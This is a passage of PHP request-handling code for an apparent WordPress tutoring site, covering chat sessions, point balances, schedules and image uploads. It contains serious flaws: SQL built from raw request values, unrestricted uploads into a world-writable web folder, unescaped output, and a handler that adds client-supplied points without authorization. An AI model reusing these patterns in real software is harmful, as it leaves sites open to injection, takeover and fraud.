            $html .= '<div class="col-md-6" style="height:100%;padding-left: 0px !important;border: 1.5px solid #2e6da4;"><button style="width:100%;height:100%;backgroup:none" class="btn-popup-styleNo btn-close-bp ' . $_check . '">' . __('No', 'iii-dictionary') . '</button></div>';
            $html .= '<input form="main-form" type="hidden" name="return-math" value="' . $_return . '" />';
            $html .= '</div></div>';
        } else {
            $data = array(
                'sheet_id' => $_sheet_id,
                'user_id' => $_user_id,
                'teacher_id' => 0,
                'price' => $_price_chat,
                'datetime' => date('Y-m-d', time()),
                'url' => $_return,
                'status' => 0
            );
            $check_exists = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_session AS dcs 
                                                WHERE dcs.sheet_id = ' . esc_sql($_sheet_id) . ' AND dcs.user_id = ' . esc_sql($_user_id) . ' AND dcs.status != 2');

            if (count($check_exists) == 0) {

                $current_user = get_userdata($_user_id);
                $row_sheet = MWDB::get_math_sheet_by_id($_sheet_id);
                $roles = array("r-teacher", "q-teacher", "mr-teacher", "mq-teacher");

                $subject_email = 'The subject of tutoring, Title: ' . $row_sheet->sheet_name;

                $message = '<p>Here is the email notification (Choose one in the (   ) area)</p></br>';
                $message .= '<p>A student is requesting (English writing tutoring, Math tutoring).</p>';
                $message .= '<p>Please check ikteach.com and check to see if you can help.</p></br>';
                $message .= '<p>The student name: ' . $current_user->display_name . '</p>';
                $message .= '<p>The tutoring language requested: Math</p>';
                $message .= '<p>The subject of tutoring, Title: ' . $row_sheet->sheet_name . '</p></br>';
                $message .= '<p>After you complete the request, the student has an opportunity to grade your tutoring quality.</p>';
                $message .= '<p>We will be keeping such data to provide the better tutoring to students.</p>';
                $message .= '</br><p>Thanks</p></br>';
                $message .= '<p>Support, iklearn.com</p>';
                $message .= '<p>This is email Notification Text</p>';

                $headers = array('Content-Type: text/html; charset=UTF-8');

                $teaches = MWDB::get_users_with_role($roles);
                if (count($teaches) > 0) {
                    foreach ($teaches as $key => $value) {
                        wp_mail($value->user_email, $subject_email, $message, $headers);
                    }
                }

                $result = $wpdb->insert($wpdb->prefix . 'dict_chat_session', $data);
            }

            switch ($check_exists[0]->status) {
                case 1 :
                    $teacher = get_userdata($check_exists[0]->teacher_id);
                    $html .= '<div id="block-start">';
                    $html .= '<div class="col-md-12" style="height: 100%;"><p style="padding: 15px;">' . __('A teacher ', 'iii-dictionary') . '' . $teacher->user_email . '' . __(' has responded. Would you like to start the tutoring now ?', 'iii-dictionary');
//                      $html  .= '<div class="col-md-12">Would you like to start the tutoring now ?</div>';
                    $html .= '<div class="col-md-12" id="start-now"><button data-teacher="' . $teacher->user_email . '" style="width:100%;height:100%" id="start-session" class="btn-popup-style">' . __('Start Now', 'iii-dictionary') . '</button></div>';
                    $html .= '</div>';
                    break;
                case 2 :
                    break;
                default :
                    $html = '<div class="col-md-12 block-respone-content"><p style="padding: 15px;">' . __('Your request has been sent to the teacher\'s panel. Please wait until a teacher responses', 'iii-dictionary') . '</p></div>';
//                      $html  .= '<div class="col-md-12 block-respone-wait">' . __('Please wait until a teacher responses', 'iii-dictionary') . '</div>';
                    $html .= '<div class="col-md-12" id="quit-now"><button class="btn-popup-style btn-cancel-session" style="width:100%;height:100%" >' . __('Quit Now', 'iii-dictionary') . '</button></div>';
                    break;
            }
            //store request chat to database
        }
        echo $html;
        exit;
    }

    if ($do === 'notice') {
        global $wpdb;
        $id = $_POST['id'];
        switch ($id) {
            case 8 :
                $html = '<p>Previous lesson ended you need reload site before start new lesson?</p>';
                break;
            case 7 :
                $_id = ( $_POST['_id'] ) ? $_POST['_id'] : '';
                $wpdb->update($wpdb->prefix . 'dict_chat_session', array('room' => 1), array('id' => $_id));
                break;
            case 6 :
                $sid = (filter_var($_POST['sid'], FILTER_VALIDATE_INT)) ? $_POST['sid'] : 0;
                $uid = (filter_var($_POST['uid'], FILTER_VALIDATE_INT)) ? $_POST['uid'] : 0;

                $check_info = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_session AS dcs WHERE dcs.sheet_id = ' . esc_sql($sid) . ' AND dcs.user_id = ' . esc_sql($uid) . ' AND dcs.status = 2');

                $html .= '<div class="col-md-12 block-respone-content"><textarea  class="txt-evaluation" id="txt-evaluation" autocomplete="off"></textarea></div>';
                $html .= '<div class="col-md-12 text-right"><button class="btn-popup-style" type="button" id="btn-evaluation">' . __('OK', 'iii-dictionary') . '</button></div>';
                $html .= '<input form="main-form" type="hidden" name="tid" id="txt-tid" value="' . $check_info[0]->teacher_id . '" />';
                break;
            case 5 :
                $html = '<div class="col-md-12 block-quit-content">' . __('Your teacher terminated the session', 'iii-dictionary') . '</div>';
                break;
            case 4 :
                $html = '<div class="col-md-12 block-quit-content">' . __('The student terminated the session.') . '</div>';
                break;
            case 3 :
                $uid = (filter_var($_POST['uid'], FILTER_VALIDATE_INT)) ? $_POST['uid'] : 0;
                $sid = (filter_var($_POST['sid'], FILTER_VALIDATE_INT)) ? $_POST['sid'] : 0;
                $points = ik_get_user_points($uid);
                $price = mw_get_option('math-chat-price');
                $check_info = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_session AS dcs 
                                                        WHERE dcs.sheet_id = ' . esc_sql($sid) . ' AND dcs.user_id = ' . esc_sql($uid) . ' AND dcs.status != 2');
                $teacher = get_userdata($check_info[0]->teacher_id);
                $minutes = $points / $price;

                $html .= '<div class="col-md-12 block-respone-content">' . __('The teacher, ' . $teacher->display_name . ' has accepted your request.', 'iii-dictionary') . '</div>';
                $html .= '<div class="col-md-12 block-respone-content">' . __('Your current balance is ' . $points . ' points.', 'iii-dictionary') . '</div>';
                $html .= '<div class="col-md-12 block-respone-content">' . __('You can get the tutoring for ' . number_format($minutes, 2, '.', '') . ' minutes.', 'iii-dictionary') . '</div>';
                $html .= '<div class="col-md-12 block-respone-content">' . __('You can stop the tutoring at any time by closing the windows.', 'iii-dictionary') . '</div>';
                $html .= '<div class="col-md-12 block-respone-content">' . __('Please write your evaluation of this teacher after the tutoring is complete.', 'iii-dictionary') . '</div>';
                break;
            case 2 :
                $html .= '<div class="col-md-12 block-respone-question">' . __('Message from Administrator: Sorry, your point balance has been used up. Please obtain points again to continue……', 'iii-dictionary') . '</div>';
                $html .= '<div class="col-md-12 block-popup-btn"><div class="row">';
                $html .= '<div class="col-md-12 text-right"><button name="btn-purchase-points" type="submit" form="main-form" class="btn-popup-style">' . __('OK', 'iii-dictionary') . '</button></div>';
                $html .= '<input form="main-form" type="hidden" name="return-math" value="' . $_POST['return'] . '" />';
                $html .= '</div></div>';
                break;
            case 1 :
                $html = '<p style="padding-left: 20%; ">Do you want to quit tutoring?</p>';
                break;
            case 0 :
                $is_con = ( $_POST['is_con'] ) ? 'not_enough' : 'continue_session';
                $html = '<div class="col-md-12 block-continue-content">' . __('Do you want continue this session ?', 'iii-dictionary') . '</div>';
                $html .= '<div class="col-md-6"><button class="btn-popup-style ' . $is_con . '">' . __('Yes', 'iii-dictionary') . '</button></div>';
                $html .= '<div class="col-md-6"><button class="btn-popup-style btn-quit">' . __('No', 'iii-dictionary') . '</button></div>';
                break;
        }

        echo $html;
    }
    if ($do === 'update_quit_status') {
        global $wpdb;
        $_id = ( $_POST['_id'] ) ? $_POST['_id'] : '';
        $id = ( $_POST['id'] ) ? $_POST['id'] : '';
        $wpdb->update($wpdb->prefix . 'dict_chat_session', array('quit_status' => $id), array('id' => $_id));
    }
    if ($do === 'update_name_grade_chat') {
        global $wpdb;
        $id = ( $_POST['idroom'] ) ? $_POST['idroom'] : 0;
        $level_name = ( $_POST['level_name'] ) ? $_POST['level_name'] : null;
        $level_grade = ( $_POST['level_grade'] ) ? $_POST['level_grade'] : null;
        $price = ( $_POST['price'] ) ? $_POST['price'] : null;
        if ($level_name != null) {
            $wpdb->update($wpdb->prefix . 'dict_chat_session', array('session_name' => $level_name), array('id' => $id));
        }
        if ($level_grade != null) {
            $wpdb->update($wpdb->prefix . 'dict_chat_session', array('grade' => $level_grade), array('id' => $id));
        }
        if ($price != null) {
            $wpdb->update($wpdb->prefix . 'dict_chat_session', array('price' => $price), array('id' => $id));
        }
    }

    if ($do === 'update_session') {
        global $wpdb;
        $id_teacher = $_POST['teacher_id'];
        $id_user = $_POST['user_id'];
        $room = $id_teacher . "." . $id_user;
        $data = array(
            'teacher_id' => $id_teacher,
            'status' => 1,
            'flag' => 1,
            'room' => $room,
        );

        $result = $wpdb->update($wpdb->prefix . 'dict_chat_session', $data, array('id' => (filter_var($_POST['id'], FILTER_VALIDATE_INT)) ? $_POST['id'] : 0));

        echo $result;
        exit;
    }

    if ($do === 'insert_history') {
        global $wpdb;
        $data = array(
            'from_id' => $_POST['from_id'],
            'to_id' => $_POST['to_id'],
            'from_time' => $_POST['from_time'],
            'content' => $_POST['content'],
            'room' => $_POST['room'],
        );
        $chat_session = $wpdb->get_row('SELECT room FROM ' . $wpdb->prefix . 'dict_chat_session WHERE id = ' . esc_sql($_POST['idroom']));
        if ($chat_session->room == 0) {
            $wpdb->insert($wpdb->prefix . 'dict_chat_history', $data);
            echo $wpdb->insert_id;
            exit;
        } else {
            echo 1;
            exit;
        }
    }

    if ($do === 'update_history') {
        global $wpdb;
        $id = $_POST['id'];
        $wpdb->update($wpdb->prefix . 'dict_chat_history', array('to_time' => $_POST['to_time']), array('id' => $id));

        echo $id;
        exit;
    }

    if ($do === 'get_history') {
        global $wpdb;
        $html = '';
        $id = (filter_var($_POST['id'], FILTER_VALIDATE_INT)) ? $_POST['id'] : 0;
        $room = $_POST['room'];
        $student = $_POST['idstudent'];
        $teacher = $_POST['idteacher'];

        $results = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_history AS dch WHERE dch.room = ' . esc_sql($room) . ' ORDER  BY id DESC');
//                        if($results[0]->from_id == $student){
//                                $html .= '<span class="wplc-user-message" style="text-decoration: none;"> Student : '.  get_user_by('id', $results[0]->from_id)->user_nicename .'</span><div class="wplc-clear-float-message"></div>';
//                                $html .= '<span class="wplc-admin-message " style="text-decoration: none;"> Tutor : '.  get_user_by('id', $results[0]->to_id)->user_nicename .'</span><br /><div class="wplc-clear-float-message"></div>';
//                        }else{
//                                $html .= '<span class="wplc-user-message " style="text-decoration: none;"> Tutor : '.  get_user_by('id', $results[0]->to_id)->user_nicename .'</span><div class="wplc-clear-float-message"></div>';
//                                $html .= '<span class="wplc-admin-message " style="text-decoration: none;"> Student : '.  get_user_by('id', $results[0]->from_id)->user_nicename .'</span><br /><div class="wplc-clear-float-message"></div>';
//                            
//                        }
        foreach ($results AS $data) {
            if ($data->from_id == $id) {
                $html .= '<span class="wplc-user-message">Student : ' . wp_unslash($data->content) . '</span><div class="wplc-clear-float-message"></div>';
            } else {
                $html .= '<span class="wplc-admin-message"><strong></strong> Tutor : ' . wp_unslash($data->content) . '</span><br /><div class="wplc-clear-float-message"></div>';
            }
        }
        echo $html;
        exit;
    }

    if ($do === 'start_session') {
        global $wpdb;
        $sid = (filter_var($_POST['sid'], FILTER_VALIDATE_INT)) ? $_POST['sid'] : 0;
        $uid = (filter_var($_POST['uid'], FILTER_VALIDATE_INT)) ? $_POST['uid'] : 0;

        $is_mw_registered_teacher = is_mw_registered_teacher($uid);
        if ($is_mw_registered_teacher) {
            $col = 'teacher_id';
        } else {
            $col = 'user_id';
        }

        $wpdb->update($wpdb->prefix . 'dict_chat_session', array('flag' => 0), array('sheet_id' => $sid, $col => $uid));

        $result = $wpdb->get_var('SELECT COUNT(*) FROM ' . $wpdb->prefix . 'dict_chat_session WHERE sheet_id = ' . $sid . ' AND user_id= ' . $uid);

        echo ($result > 0) ? true : false;
        exit;
    }

    if ($do === 'update_points') {
        global $wpdb;
        $uid = (filter_var($_POST['uid'], FILTER_VALIDATE_INT)) ? $_POST['uid'] : 0;
        $tid = (filter_var($_POST['tid'], FILTER_VALIDATE_INT)) ? $_POST['tid'] : 0;
        $sid = (filter_var($_POST['sid'], FILTER_VALIDATE_INT)) ? $_POST['sid'] : 0;
        $_id = (filter_var($_POST['_id'], FILTER_VALIDATE_INT)) ? $_POST['_id'] : 0;
        $points = ik_get_user_points($uid);
        $t_points = ik_get_user_points($tid);
        $price = mw_get_option('math-chat-price');
        $ratio = mw_get_option('math-teacher-share');
        $ratio_teacher = $price * (int) $ratio / 100;
        $chat_session = $wpdb->get_row('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_session AS dcs WHERE dcs.sheet_id = ' . esc_sql($sid) . ' AND dcs.user_id = ' . esc_sql($uid) . ' AND dcs.teacher_id = ' . esc_sql($tid) . ' AND dcs.status = 1 ORDER BY dcs.id DESC');
        if ($points >= $price) {
            $u_update_points = $points - $price;
            $t_update_points = $t_points + $ratio_teacher;
            update_user_meta($uid, 'user_points', $u_update_points);
            update_user_meta($tid, 'user_points', $t_update_points);
            exit;
        } else {
            echo 2;
            exit;
        }
    }

    if ($do === 'clear_session') {
        global $wpdb;
        $sid = (filter_var($_POST['sid'], FILTER_VALIDATE_INT)) ? $_POST['sid'] : 0;
        $uid = (filter_var($_POST['uid'], FILTER_VALIDATE_INT)) ? $_POST['uid'] : 0;

        $is_mw_registered_teacher = is_mw_registered_teacher($uid);
        if ($is_mw_registered_teacher) {
            $col = 'teacher_id';
        } else {
            $col = 'user_id';
        }

        $numrows = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_session AS dcs WHERE dcs.sheet_id = ' . esc_sql($sid) . ' AND dcs.' . $col . ' = ' . esc_sql($uid) . ' AND dcs.status = 1');

        if (count($numrows) > 0 && $numrows[0]->flag != 1) {

            $wpdb->update($wpdb->prefix . 'dict_chat_session', array('status' => 2), array('sheet_id' => $sid, $col => $uid));

            if ($is_mw_registered_teacher) {
                echo 5;
                exit;
            } else {
                echo 4;
                exit;
            }
        } else {
            $wpdb->update($wpdb->prefix . 'dict_chat_session', array('flag' => 0), array('sheet_id' => $sid, $col => $uid));
            echo 0;
            exit;
        }
    }

    if ($do === 'cancel_session') {
        global $wpdb;
        $sid = (filter_var($_POST['sid'], FILTER_VALIDATE_INT)) ? $_POST['sid'] : 0;
        $uid = (filter_var($_POST['uid'], FILTER_VALIDATE_INT)) ? $_POST['uid'] : 0;

        $is_mw_registered_teacher = is_mw_registered_teacher($uid);
        if ($is_mw_registered_teacher) {
            $col = 'teacher_id';
        } else {
            $col = 'user_id';
        }

        $numrows = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_session AS dcs WHERE dcs.sheet_id = ' . esc_sql($sid) . ' AND dcs.' . $col . ' = ' . esc_sql($uid) . ' AND dcs.status = 1');

        if (count($numrows) > 0) {

            $wpdb->delete($wpdb->prefix . 'dict_chat_session', array('sheet_id' => $sid, $col => $uid));

            if ($is_mw_registered_teacher) {
                echo 5;
                exit;
            } else {
                echo 4;
                exit;
            }
        } else {
            echo 0;
            exit;
        }
    }
    if ($do === 'my_own_image') {
        global $wpdb;
        $homework = MWDB::get_math_sheet_by_id($_POST['sid']);
        $questions = json_decode($homework->questions, true);
        $arr_img = array();
        if (count($questions['q']) > 0) {
            foreach ($questions['q'] as $key => $item) {
                if ($item['image'] != '') {
                    $arr_img[] = MWHtml::math_image_url($item['image']);
                }
            }
        }
        $has_err = false;
        $data = array(
            'main-path' => 'media/temp',
            'uid' => $_POST['client'],
            'sid' => $_POST['sid'],
            'count' => count($_FILES['input-file-media']['name']),
            'files' => $_FILES['input-file-media']
        );

        $structure = $data['main-path'] . '/' . $data['uid'];
        if (file_exists($structure) && !$has_err) {
            $has_err = true;
        }

        if (!$has_err) {
            mkdir($structure, 0777, true);
        }
        if ($data['files']['error'][0] == 4) {
            echo 0;
            exit();
        }

        $dir = $data['main-path'];
        $dir .= '/' . $data['uid'];
        for ($i = 0; $i < $data['count']; $i++) {
            move_uploaded_file($data['files']['tmp_name'][$i], $dir . '/' . basename($data['sid'] . '-' . $data['files']['name'][$i]));
            $arr_img[] = site_url() . '/media/temp/' . $data['uid'] . '/' . basename($data['sid'] . '-' . $data['files']['name'][$i]);
        }

        //$files = dirlist($dir);
        // print_r($files);exit();

        echo json_encode($arr_img);

        exit();
    }

    if ($do === 'math_sheet') {
        global $wpdb;
        $homework = MWDB::get_math_sheet_by_id($_POST['sid']);
        $questions = json_decode($homework->questions, true);
        $arr_img = array();

        if (count($questions['q']) > 0) {
            foreach ($questions['q'] as $key => $item) {
                if ($item['image'] != '') {
                    $arr_img[] = MWHtml::math_image_url($item['image']);
                }
            }
        }

        $dir = 'media/temp/' . $_POST['client'];
        $arr = array();
        if (!@is_dir($dir)) {
            $handle = @opendir($dir);

            while ($file = @readdir($handle)) {
                $arr[] = $file;
            }

            if (count($arr) > 0) {
                for ($i = 0; $i < count($arr); $i++) {
                    $filename = explode('-', $arr[$i]);
                    if ($filename[0] == $_POST['sid']) {
                        $arr_img[] = site_url() . '/' . $dir . '/' . $arr[$i];
                    }
                }
            }
        }

        echo json_encode($arr_img);

        exit();
    }
}

if ($task == "update_evaluation") {
    $id = isset($_REQUEST['id']) ? $_REQUEST['id'] : 0;
    $txt_eval = isset($_REQUEST['txt_eval']) ? $_REQUEST['txt_eval'] : '';

    if ($id != 0) {
        MWDB::update_evaluation($txt_eval, $id);
        echo(1);
    } else {
        echo(0);
    }
    exit();
}

if ($task == "update-evaluation-english") {
    $id = isset($_REQUEST['id']) ? $_REQUEST['id'] : 0;
    $txt_eval = isset($_REQUEST['txt_eval']) ? $_REQUEST['txt_eval'] : '';

    if ($id != 0) {
        MWDB::update_evaluation_english($txt_eval, $id);
        echo(1);
    } else {
        echo(0);
    }
    exit();
}

if ($task == 'get_detail_sub') {
    $subid = $_REQUEST['subid'];
    $result = MWDB::get_user_subscription_details($subid);
    if ($result) {
        echo '<h2 class="title-border" style="color: black; margin-left: 5%;">' . $result->code_type . ' Subscription</h2>';
        echo '<div style="padding: 0px 5% 0px 5%; font-size: 15px;">';
        echo '<table class="table table-striped table-style3 table-custom-2">';
        if ($result->encoded_code != null) {
            echo '<tr><td>Subscription Code:</td>';
            echo '<td colspan="2">' . $result->encoded_code . '</td></tr>';
        }
        echo '<tr>';
        echo '<td style="width: 200px">Subscription Type: </td>';
        if ($result->typeid == 25) {
            echo '<td colspan="2">' . $result->sat_class . '</td>';
        } else {
            echo '<td colspan="2">' . $result->code_type . '';
            if ($result->typeid == SUB_SAT_PREPARATION) {
                echo '' . $result->sat_class . '';
            } else {
                echo ' ';
            }
        }
        echo '</tr>';
        echo '<tr>';
        echo '<td>Subscription Start: </td>';
        echo '<td colspan="2">' . $result->activated_on . '</td>';
        echo '</tr>';
        echo '<tr>';
        echo '<td>Subscription End:</td>';
        echo '<td colspan="2">' . $result->expired_on . ' ';
//        if($date = $result->expired_on - $result->activated_on >=0) {
//        echo ''.$result->expired_on - $result->activated_on.'day left'; 
//        }       
        echo '</td>';
        echo '</tr>';
        if (!empty($result->dictionary)) :
            echo '<tr>';
            echo '<td>Dictionary: </td>';
            echo '<td colspan="2">' . $result->dictionary . '</td>';
            echo '</tr>';
        endif;
        if (!empty($result->group_name)) :
            echo '<tr>';
            echo '<td>Group Name: </td>';
            echo '<td colspan="2">' . $result->group_name . '</td>';
            echo '</tr>';
        endif;
        if ($result->typeid != SUB_SAT_PREPARATION) :
            echo '<tr>';
            echo '<td>';
            if ($result->typeid) {
                echo 'Number of Students';
            } else {
                echo 'Number of Users';
            }
            echo '</td>';
            echo '<td colspan="2">' . $result->number_of_students . '</td>';
            echo '</tr>';
        endif;
        if ($result->typeid == SUB_DICTIONARY) :
            echo '<tr>';
            echo '</tr>';
            echo '<tr>';
            echo '<td></td>';
            echo '<td>';
            echo '- You can activate other user accounts by entering this activation code. <br>';
            echo '- For public computers, please see the guideline at Manage Subscription panel. ';
            echo '</td>';
            echo '</tr>';
        endif;
        echo '</table></div>';
    }else {
        echo '<p>Chưa có dữ liệu</p>';
    }
}
if ($task == "change_status") {
    $id = $_REQUEST['st_id'];
    if ($id != 0) {
        $ch_status = MWDB::update_status_private_input($id);
    } else {
        
    }
    exit();
}
if ($task == 'insert_ikmath_tutoring_plan') {
//        $array_date = $_REQUEST['date'];
    $subject = $_REQUEST['subject'];
    $date = $_REQUEST['date'];
    $time = $_REQUEST['time'];
    $zone = $_REQUEST['zone'];
    $sub = $_REQUEST['subject_private'];
    $total = $_REQUEST['total'];
    $tutor = $_REQUEST['tutor'];
    $message = $_REQUEST['short_message'];
    $tutor_id = $_REQUEST['tutor_id'];
    $result = $wpdb->get_row("SELECT * FROM " . $wpdb->prefix . "dict_tutoring_plan WHERE subject = '".$subject."' AND time = '".$time."'");

    if (is_null($result)) {
        if (MWDB::store_ikmath_tutoring_plan($subject, $date, $time, $zone, $sub, $total, $tutor, $message, $tutor_id)) {
            echo 'update success';
        } else {
            echo 'update error';
        }
    }else{
        echo 'update exit';
    }
    exit;
}
//if ($task == 'get_time_list_schedule_tutor') {
//        $id = $_REQUEST['id'];
//        $list_time = MWDB::get_list_confirmed_tutoring($id);
//        exit;
//    }
//    
// View info to cancel schedule page Tutoring Plan     
//if ($task == 'get_info_cancel_schedule') {
//    $date = $_REQUEST['date']; 
//    $result = MWDB::get_infos_cancel($date); 
//    $html='';
//    $html .= '<div class="row">';
//    $html .= '<div class="form-group" style="padding-left: 1%">';
//    $html .= '<input type="hidden" id="name-sub-post" name="sub-type" value="31">';
//    $html .= '<input type="hidden" id="date-sub-post" name ="date" value="0">';
//    $html .= '<input type="hidden" id="time-sub-post" name="time" value="0">';
//    $html .= '<input type="hidden" id="duration-sub-post" name="duration" value="0">';
//    $html .= '<div style="color: #2E6690;">The following Tutoring Schedule has been cancelled.</div>';
//    $html .= '<div class="line-schedule2"></div>';
//    $html .= '<div class="left-15">';
//    $html .= '<div class="inline"><span class="css-span1">Subject:</span></div>';
//    $html .= '<div class="inline"><span class="css-span1">Name:</span></div>';
//    $html .= '<div class="inline"><span class="css-span1">Date:</span></div>';
//    $html .= '<div class="inline"><span class="css-span1">Time:</span></div>';
//    $html .= '<div class="inline"><span class="css-span1">Duration:</span></div>';
//    $html .= '</div>';
//    $html .= '<div class="right-85">';
//    $html .= '<p class="col-xs-12 font-bold-4c4c4c css-padding-left-0" id="date-subject-refunded">'.$result[0]->subject.'</p>';
//    $html .= '<p class="col-xs-12 font-bold-4c4c4c css-padding-left-0" id="date-name-refunded">'.$result[0]->private_subject.'</p>';
//    $html .= '<p class="col-xs-12 font-bold-4c4c4c css-padding-left-0" id="date-sub-refunded">'.$result[0]->date.'</p>';
//    $html .= '<p class="col-xs-12 font-bold-4c4c4c css-padding-left-0" id="time-sub-refunded">'.$result[0]->time.'</p>';
//    $html .= '<p class="col-xs-12 font-bold-4c4c4c css-padding-left-0" id="duration-sub-refunded" >'.$result[0]->total_time.' Minutes Total'.'</p>';
//    $html .= '</div>';
//    $html .= '</div>';                          
//    $html .= '<div class="row">';                          
//    $html .= '<div class="col-sm-12 padding-top-2">';                          
//    $html .= '<div class="box-gray-dialog" style="text-align: left">';   
//    $total_time = $result[0]->total_time;
//    $pst = mw_get_option('price_schedule_tutoring');
//    $total = $total_time * $pst/100;
//    $html .= 'Total Refunded:<span class="currency" style="color:#697E31;font-weight: bold;" id="total-refunded-points">'.' '. $total .'</span><span style="font-weight: normal;"> Points</span>';                          
//    $html .= '</div>';
//    $html .= '</div>';                          
//    $html .= '</div>'; 
//    
//    echo $html;
//    die;
//}

if ($task == "update_total_point") {
    $point = $_REQUEST['point'];
    $id = $_REQUEST['id'];
    $get_point = ik_get_user_points($user->ID);
    $point = $point + $get_point;
    MWDB::update_refunded_point($point, $id);
    exit();
}
if ($task == "auto_cancel_schedule") {
    $id = $_REQUEST['id'];
    $get_point = ik_get_user_points($user->ID);
    $point = MWDB::get_info_schedule_by_id($id);
    $p = $point[0]->total_time;
    $pst = mw_get_option('price_schedule_tutoring');
    $total = $p * $pst / 100;
    $point = $total + $get_point;
    MWDB::auto_update_refunded_point($point, $id);
    exit();
}

if ($task == "paid_wp_dict_tutoring") {
    MWDB::paid_wp_dic_tutoring_plan();
    echo 1;
    exit();
}

if ($task == "update-id-home") {
//    echo 1;die;
    $homes_id = MWDB::get_id_all_dict_homeworks();
    for ($i = 0; $i < count($homes_id) - 1; $i++) {
        $id = $homes_id[$i]->id;
        $id_next = $homes_id[$i + 1]->id;
        MWDB::update_next_homework_id_for_homeworks($id, $id_next);
    }
    exit();
}

if ($task == "check_sub_by_type") {
    $type = $_REQUEST['type'];
    $is_sat_class_subscribed = is_sat_class_subscribed($type);
    if ($is_sat_class_subscribed == false || $is_sat_class_subscribed == null) {
        echo 0;
    } else {
        echo "1";
    }
    exit();
}

if ($task == "show_panel") {
    $id = $_REQUEST['id'];
    $check = $_REQUEST['show_panel'];
    $rs=MWDB::update_show_panel($id, $check);
    
    if($rs){
        echo 1;
    }else{
        echo 0;
    }
    exit();
}
if ($task == "get-info-schedule-reminder") {
    $id = $_REQUEST['id'];
    $html = '';
    for ($i = 0; $i < count($id); $i++) {
        $data = MWDB::get_info_schedule_by_id($id[$i]);
//        $html.='<div class="btn" style="width:100%;background: #A0AB80" data-toggle="collapse" data-target="#table-'.$id[$i].'" >'.$data[0]->private_subject.'</div>';
        $html .= '<div class="btn css-head-modal-reminder btn-dropdown-reminder"  data-toggle="collapse" data-target="#table-' . $id[$i] . '" ><span style="margin-right: 43px;">Subject</span>' . $data[0]->private_subject . '</div>';
        $html .= '<div id="table-' . $id[$i] . '" class="collapse" >';
        $html .= '<table class="table table-striped table-condensed ik-table1 vertical-middle" id="table-reminder">';
        $html .= '<tbody>';
        $html .= '<tr>';
        $html .= '<td>Tutor</td>';
        if ($data[0]->type_tutor == 0) {
            if ($data[0]->tutor_id) {
                $html .= '<td>' . $data[0]->tutor_id . '</td>';
            } else {
                $html .= '<td>Request Previous Tutor </td>';
            }
        } else {
            $html .= '<td>Request a New Tutor</td>';
        }
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td>Date</td>';
        $date = $data[0]->date;  // 2018-04-17
        $res = explode("-", $date);
        $new_date = $res[1] . "/" . $res[2] . "/" . $res[0];
        $html .= '<td>' . $new_date . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td>Time</td>';
        $full_time = $data[0]->time;
        $str = explode("~", $full_time);
        $str1 = explode(":", $str[0]);
        $str2 = explode(":", $str[1]);
        if ($str1[0] > 12) {
            $str1[0] = $str1[0] - 12;
        }
        if ($str1[0] < 10) {
            $str1[0] = "0" . $str1[0];
        }
        if ($str2[0] > 12) {
            $str2[0] = $str2[0] - 12;
        }
        if ($str2[0] < 10) {
            $str2[0] = "0" . $str2[0];
        }
        $time = $str1[0] . ':' . $str1[1] . ':' . $str1[2] . '~ ' . $str2[0] . ':' . $str2[1] . ':' . $str2[2];
        $html .= '<td>' . $time . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td>Status</td>';
        if ($data[0]->confirmed == 0) {
            $html .= '<td>Waiting</td>';
        } else {
            $html .= '<td>Confirmed</td>';
        }
        $html .= '</tr>';
        $html .= '</tbody>';
        $html .= '</table>';
        $html .= '</div>';
    }
    echo $html;
    die;
}

if ($task == "load_list_can_schedule") {
    $rq_day = $_REQUEST['day'];
    $arr_id = $_REQUEST['arr_id']; // list id có thể cancel (Tất cả các schedule lớn hơn thời gian hiện tại) 
    // check db lấy ra những id chedule bằng ngày được chọn
    $day = explode("/", $rq_day);
    $day = $day[2] . '-' . $day[0] . '-' . $day[1];
    $pst = mw_get_option('price_schedule_tutoring');
//    var_dump($arr_id);die;
    $html = '';
    for ($i = 0; $i < count($arr_id); $i++) {
        $data = MWDB::get_list_data_can($arr_id[$i], $day);
        if ($data) {
            $html .= '<div class="row css-div-schedule">';
            $html .= '<div class="col-md-8" style="text-align:left">';
            $html .= '<div class="txt-name-schedule">' . $data[0]->private_subject . '</div>';
            $html .= '<span class="txt-date-time-schedule">' . $rq_day . '</span>';
            // Chuyển time từ định dạng 24h về 12h    
            $full_time = $data[0]->time;
            $str = explode("~", $full_time);
            $str1 = explode(":", $str[0]);
            $str2 = explode(":", $str[1]);
            if ($str1[0] > 12) {
                $str1[0] = $str1[0] - 12;
            }
            if ($str1[0] < 10) {
                $str1[0] = "0" . $str1[0];
            }
            if ($str2[0] > 12) {
                $str2[0] = $str2[0] - 12;
            }
            if ($str2[0] < 10) {
                $str2[0] = "0" . $str2[0];
            }
            $time = $str1[0] . ':' . $str1[1] . ':' . $str1[2] . '~ ' . $str2[0] . ':' . $str2[1] . ':' . $str2[2];
            $html .= '<span class="txt-date-time-schedule">' . ' - ' . $time . '</span>';
            $html .= '</div>';
            $total_time = $data[0]->total_time;
            $total = $total_time * $pst / 100;
            $html .= '<div class="col-md-4">';
            $html .= '<input type="button" class="btn-yes-cancel css-btn-yes-cancel" data-id="' . $data[0]->id . '" data-points="' . $total . '" value="Yes, Cancel">';
            $html .= '</div>';
            $html .= '</div>';
        }
    }
    $html .= '<div><input type="button" value="Close Window" class="btn-close-window-schedule"></div>';
    echo $html;
    die;
}

if ($task == "check_login_user") {
    $login = 0;
    if (is_user_logged_in()) {
        $login = 1;
    }
    echo $login;
    die;
}

if ($task == "get_assignment_id_by_sid") {
    $sid = $_REQUEST['sid'];
    $data = MWDB::get_assignment_id_by_sid($sid);
    echo $data;
    die;
}

// type 1 -> assignment_id == 7 || assignment_id == 8 || assignment_id == 9 || assignment_id == 10
if ($task == "set_answer_test_mode_type1") {
    $hid = $_REQUEST['hid'];
    $answer = $_REQUEST['data_answer'];
    $data_correct_answer = $_REQUEST['data_correct_answer'];
    $user_id = get_current_user_id();
    $check = MWDB::check_answer_user_exit($user_id, $hid);

    // Tính điểm tự động insert vào db
    $score = 100;
    $answer_corr = '';
